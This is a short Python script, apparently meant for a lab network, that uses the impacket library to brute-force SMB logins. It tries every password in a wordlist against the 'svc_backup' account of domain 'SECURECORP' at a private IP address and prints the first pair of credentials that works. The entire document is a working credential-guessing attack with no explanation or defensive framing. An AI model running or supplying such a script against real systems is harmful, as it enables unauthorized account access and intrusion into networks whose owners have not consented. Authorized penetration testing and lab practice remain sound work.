from impacket.smbconnection import SMBConnection

target_ip = "192.168.56.101"
username = "svc_backup"

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f]

for password in passwords:
    try:
        conn = SMBConnection(target_ip, target_ip)
        conn.login(username, password, domain="SECURECORP")
        print(f"SUCCESS: {username}:{password}")
        conn.close()
        break
    except Exception as e:
        print(f"Failed: {password}")